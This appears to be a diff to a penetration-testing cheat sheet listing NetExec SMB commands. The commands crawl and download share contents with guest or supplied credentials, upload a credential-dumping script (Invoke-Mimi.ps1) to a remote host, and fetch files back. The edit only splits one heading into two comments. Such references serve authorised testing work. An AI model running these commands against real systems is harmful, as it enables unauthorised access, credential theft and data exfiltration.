@@ -42,8 +42,10 @@ nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER
 nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
 
 
-## Use nxc to put or get file or tool remotely
+# NetExec SMB Put file on remote
 nxc smb <ip> -u '<username>' -p '<password>' --put-file /workspace/Invoke-Mimi.ps1 \\users\\public\\Invoke-Mimi.ps1
+
+# NetExec SMB Get file from remote
 nxc smb <ip> -u '<username>' -p '<password>' --get-file \\users\\public\\File.docx /workspace/File.docx
 
 
